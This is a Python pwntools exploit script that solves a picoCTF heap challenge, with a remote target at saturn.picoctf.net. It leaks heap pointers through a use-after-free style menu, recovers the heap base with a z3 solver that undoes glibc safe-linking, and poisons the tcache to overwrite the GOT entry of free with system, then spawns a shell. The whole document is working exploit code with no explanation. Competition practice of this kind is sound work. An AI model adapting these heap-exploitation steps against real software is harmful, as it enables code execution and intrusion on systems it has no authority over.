from pwn import *
from z3 import *
import sys

file = ELF("./vuln")
if args.REMOTE:
    io = remote("saturn.picoctf.net", 55281)
else:
    io = process("./vuln", stderr=sys.stdout)

choice = b"Choice: "
number = b"? "

def make(index, data, length=None):
    io.sendlineafter(choice, b"1")
    io.sendlineafter(b"? ", str(index).encode())
    if length == None:
        length = len(data)
    io.sendlineafter(b"? ", str(length).encode())
    io.sendlineafter(b": ", data)

def kill(index):
    io.sendlineafter(choice, b"2")
    io.sendlineafter(b"? ", str(index).encode())

def edit(index, weight, data):
    io.sendlineafter(choice, b"0")
    io.sendlineafter(b"? ", str(index).encode())
    io.sendlineafter(b": ", data)
    io.sendlineafter(b"? ", str(weight).encode())

def race():
    io.sendlineafter(choice, b"3")

def parse(horses):
    def find(haystack, needles):
        split = 12345
        for needle in needles:
            try:
                now = haystack.index(needle)
                split = min(split, now)
            except:
                continue
        return split

    lines = list()
    for i in range(horses):
        line = io.recvline().strip()
        split = find(line, b" \n|")
        line = line[:split]
        lines.append(line)
    return lines

def dec(leaked, off):
    leaked = BitVecVal(leaked, 48)
    off  = BitVecVal(off,48)

    res  = BitVec('res', 48)
    sss  = BitVec('sss', 48)

    s = Solver()

    s.add((sss>>12)^res==leaked)
    s.add((sss>>12)-(res>>12)==off)
    s.add((res>>40)<=0x7f)
    s.add((res>>40)>=0)

    if str(s.check()) == 'sat':
        m = s.model()
        return  m.evaluate(res).as_long() & 0xfffffffff000
    else:
        print(s.check())
        exit(1)

for i in range(5):
    make(i, b"A" * 0x38)
for i in range(5):
    kill(i)
for i in range(5):
    make(i, b"\xFF", length=0x38)

race()
leaks = parse(5)
for leak in leaks:
    leak = u64(leak.ljust(8, b'\x00'))
    print(f"[+] leak: 0x{leak:x}")
a = u64(leaks[1].ljust(8, b"\x00"))
heap_base = dec(a, 0x5b0)
print(f"[+] heap base: 0x{heap_base:x}")

kill(3)
kill(4)
edit(4, 0, p64((file.got["free"] - 8) ^ (heap_base >> 12)) + b"\xFF")
make(4, b"\xFF", length=0x38)
make(5, b"\x00" * 8 + p64(file.plt["system"]) + b"\xFF", length=0x38)
edit(4, 0, b"/bin/sh\x00" + b"\xFF")
kill(4)

io.interactive()
